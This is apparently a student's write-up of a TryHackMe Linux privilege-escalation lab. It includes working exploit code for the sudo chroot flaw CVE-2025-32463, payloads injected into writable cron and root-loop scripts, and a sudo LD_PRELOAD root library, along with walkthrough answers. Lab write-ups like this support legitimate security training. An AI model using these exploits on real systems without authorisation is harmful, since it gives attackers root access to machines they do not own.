# Linux Privilege Escalation: Automation (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Privilege Escalation (room 4; automate enumeration + use public
  exploits, building on [[linux-privilege-escalation-basics]]).
- **Room:** Linux Privilege Escalation: Automation (~45 min, premium). LES/LinPEAS enumeration, a public
  CVE exploit, `pspy` process monitoring, and a capstone challenge. Each task = its own target VM.
- **Date:** 2026-10-17.
- **Status:** SOLVED - Tasks 2-5 (LES+CVE-2025-32463, pspy, and the two-stage challenge).
- **Method:** AttackBox connected (`<ip>`); targets driven over the VPN via Python `paramiko` SSH
  (`john : john`).

## Tasks 2-3 - Automated enumeration + public exploit (same VM)

- **Target:** `<ip>` (`public-exploit`, Ubuntu 24.04.4, kernel `6.17.0-1013-aws`,
  **sudo 1.9.15p5**).
- **Answers:** Task 2 first Possible Exploit = **`CVE-2025-32463`** (sudo-chwoot). Task 3
  `/root/flag.txt` = **`THM{…}`**.

**Enumerate** - Linux Exploit Suggester is in `/home/john/linux-exploit-suggester/`:

```bash
bash /home/john/linux-exploit-suggester/linux-exploit-suggester.sh
# Possible Exploits (first):  [CVE-2025-32463] sudo-chwoot
```

**Exploit - CVE-2025-32463** (sudo `--chroot`/`-R` NSS local root; affects sudo 1.9.14-1.9.17 before
1.9.17p1). `sudo -R <dir>` resolves the user via the **chroot's** `/etc/nsswitch.conf`; pointing a service
at a user path makes glibc `dlopen` an attacker library whose `constructor` runs **as root before the
chroot is enforced**:

```bash
staging=$(mktemp -d /tmp/sudowoot.stage.XXXXXX); cd "$staging"
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void){
  setreuid(0,0); setregid(0,0);
  system("id; cat /root/flag.txt");   // real FS - chroot not yet active
  _exit(0);
}
EOF
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc/group
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
sudo -R woot woot        # -> constructor fires as root -> THM{…}
```

- **Methodology (public exploits):** enumerate (kernel/distro/sudo versions, SUID, services) -> research
  (`searchsploit <sw> <ver>`, `CVE-<id> github`, LinPEAS CVE hits) -> **evaluate** (read the code; needs
  gcc? kernel-specific? will it crash?) -> exploit (scp over, compile, run) -> verify (`id`).
- **Why this one is safe:** it's a *userland* sudo logic bug, not a kernel memory-corruption exploit - no
  crash risk, unlike the kernel CVEs LES also listed (nft UAF, Netfilter OOB).
- Adapt interactive PoCs for non-interactive capture: swap the `execl("/bin/bash",...)` shell for
  `system("cat /root/flag.txt")` + `_exit(0)` in the constructor.

## Task 4 - pspy (process monitoring)

- **Target:** `<ip>` (`pspy-box`).
- **Answers:** Q1 vulnerable script = **`/var/local/syslog-backup.sh`** (fits `/3/5/13.2`; note `/var/local`,
  not `/usr/local`). Q2 `/root/flag.txt` = **`THM{…}`**.

`pspy` (in `/home/john/`) catches short-lived root processes that static enumeration misses:

```bash
chmod +x /home/john/pspy64 ; /home/john/pspy64 -pf -i 1000
# CMD: UID=0 | /bin/bash /root/run-backup.sh          (unreadable)
# CMD: UID=0 | /bin/bash /var/local/syslog-backup.sh  <- runs on a ~10s loop as root
```

`/var/local/syslog-backup.sh` is **world-writable** (`-rwxrwxrwx root staff`) and run by root in a loop ->
append a payload, wait one cycle, restore:

```bash
ls -la /var/local/syslog-backup.sh    # -rwxrwxrwx
echo 'cp /root/flag.txt /tmp/rf.txt; chmod 666 /tmp/rf.txt' >> /var/local/syslog-backup.sh
sleep 10 ; cat /tmp/rf.txt            # THM{…}
# then restore the original script
```

- **Key idea:** `pspy` watches `/proc` via inotify (no root needed) to reveal cron jobs / looped root
  scripts that run and exit in milliseconds - exactly what LinPEAS's snapshot misses. Same exploitation as a
  writable cron (Task 6 of Basics), but the trigger is *discovered* with pspy. Enumerate the script's perms;
  if writable, it's root.

## Task 5 - Challenge (two-stage: john -> frank -> root)

- **Target:** `<ip>` (`challenge`). No sudo/SUID/caps for john - the path is a **cron pivot** then a
  **sudo LD_PRELOAD**.
- **Answers:** Q1 `/home/frank/flag.txt` = **`THM{…}`**. Q2 `/root/flag.txt` =
  **`THM{…}`**.

**Stage 1 - john -> frank.** `/etc/cron.d/frank-backup` runs `* * * * * frank /opt/scripts/backup.sh`, and
`/opt/scripts/backup.sh` is **writable by john**:

```bash
cat /etc/cron.d/frank-backup        # * * * * * frank /opt/scripts/backup.sh
find / -type f -writable 2>/dev/null | grep -v '/proc\|/sys\|/home/john'   # /opt/scripts/backup.sh
# inject (runs as frank next minute): grab frank's flag + enumerate frank's sudo
echo 'cat /home/frank/flag.txt > /tmp/ff.txt; chmod 666 /tmp/ff.txt; sudo -n -l > /tmp/fsudo.txt 2>&1; chmod 666 /tmp/fsudo.txt' >> /opt/scripts/backup.sh
# -> THM{…};  frank sudo -l: env_keep+=LD_PRELOAD, (root) NOPASSWD: /usr/bin/id
```

**Stage 2 - frank -> root.** frank's sudoers has `env_keep+=LD_PRELOAD` and a NOPASSWD binary, so a preloaded
library's constructor runs as root. Build the `.so`, then have the frank-cron run the sudo:

```bash
cat > /tmp/pre.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
  unsetenv("LD_PRELOAD"); setgid(0); setuid(0);
  system("cat /root/flag.txt > /tmp/rootout.txt; chmod 666 /tmp/rootout.txt");
}
EOF
gcc -fPIC -shared -o /tmp/pre.so /tmp/pre.c
# inject into backup.sh (runs as frank):
echo 'sudo LD_PRELOAD=/tmp/pre.so /usr/bin/id' >> /opt/scripts/backup.sh
# ~1 min later:  cat /tmp/rootout.txt  ->  THM{…}
```

- **Why it chains:** the LD_PRELOAD trick needs the *real* uid to be frank (sudo ignores `LD_PRELOAD` when
  ruid != euid), so it must run inside the frank-cron context - a SUID-frank bash (ruid still john) would not
  satisfy sudo. Running the exploit *from* the cron script solves that cleanly.
- Restore `/opt/scripts/backup.sh` after each stage (keep the box intact).

## Lessons learned

- **Automated enumeration** (LES, LinPEAS, LinEnum, lse, linux-priv-checker) saves time but misses vectors -
  know several, because the target may lack the interpreter one needs. LES matches kernel+distro+sudo to
  known CVEs; it lists the vuln and a download URL.
- **Config bug vs code bug:** the Basics room abused *misconfigurations* (software working as designed);
  public exploits abuse *bugs in the software itself* (CVE). Prefer userland CVEs over kernel ones (less
  likely to crash the box).
- **pspy for the dynamic view.** Snapshot tools miss short-lived root jobs; `pspy64` (no root needed, inotify
  + `/proc`) reveals looped root/other-user scripts and their full paths. Then it's the usual writable-script
  -> inject -> wait -> restore.
- **Chain user-to-user, not just user-to-root.** The challenge went john -> frank -> root. A writable script
  owned by / run as another user is a *lateral* pivot; re-enumerate as that user (`sudo -l` especially).
- **Run the escalation in the right uid context.** `sudo`+`LD_PRELOAD` only works when ruid==euid==the
  sudo-privileged user, so it had to execute *inside* frank's cron, not from a SUID-frank shell (ruid stays
  john). Know which uid (real vs effective) each technique needs.

## Flags

| Task | Vector | Flag |
|------|--------|------|
| 3 | public exploit - CVE-2025-32463 (sudo chroot) | `THM{…}` |
| 4 | pspy -> writable root-loop `/var/local/syslog-backup.sh` | `THM{…}` |
| 5 | challenge - frank flag (writable cron pivot) | `THM{…}` |
| 5 | challenge - root flag (frank sudo LD_PRELOAD) | `THM{…}` |

## Related

- [[linux-privilege-escalation-basics]] - the manual vectors; this room automates the hunt and adds CVEs.
- [[linux-privilege-escalation-enumeration]] - the manual enumeration these tools automate.
- [[privesc-module-plan]] - module tracker.
